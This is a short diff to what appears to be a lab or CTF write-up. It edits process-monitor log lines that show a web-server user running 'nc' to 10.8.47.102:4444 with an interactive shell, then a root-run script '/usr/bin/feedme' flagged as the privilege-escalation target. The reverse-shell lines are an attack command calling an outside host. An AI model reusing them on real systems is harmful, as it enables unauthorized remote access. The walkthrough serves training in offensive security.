@@ -183,13 +183,13 @@ done
 2025/10/14 20:02:49 CMD: UID=33    PID=2835   | nc 10.8.47.102 4444 
 2025/10/14 20:02:49 CMD: UID=33    PID=2834   | sh -i 
 [. . . .]
-2022/04/09 12:30:03 CMD: UID=0    PID=4253   | /lib/systemd/systemd-udevd
-2022/04/09 12:30:03 CMD: UID=0    PID=4252   | /lib/systemd/systemd-udevd
-2022/04/09 12:30:03 CMD: UID=0    PID=4251   | /lib/systemd/systemd-udevd
-2022/04/09 12:30:03 CMD: UID=0    PID=4250   | /lib/systemd/systemd-udevd
-2022/04/09 12:30:03 CMD: UID=0    PID=4259   | /lib/systemd/systemd-udevd
-2022/04/09 12:30:03 CMD: UID=0    PID=4261   | /bin/bash /usr/bin/feedme    <------
-2022/04/09 12:30:03 CMD: UID=0    PID=4262   | /bin/bash /usr/bin/feedme	<------
+2025/10/14 20:02:49 CMD: UID=0    PID=4253   | /lib/systemd/systemd-udevd
+2025/10/14 20:02:49 CMD: UID=0    PID=4252   | /lib/systemd/systemd-udevd
+2025/10/14 20:02:49 CMD: UID=0    PID=4251   | /lib/systemd/systemd-udevd
+2025/10/14 20:02:49 CMD: UID=0    PID=4250   | /lib/systemd/systemd-udevd
+2025/10/14 20:02:49 CMD: UID=0    PID=4259   | /lib/systemd/systemd-udevd
+2025/10/14 20:02:49 CMD: UID=0    PID=4261   | /bin/bash /usr/bin/feedme    <------
+2025/10/14 20:02:49 CMD: UID=0    PID=4262   | /bin/bash /usr/bin/feedme	<------
 [...]
 
 
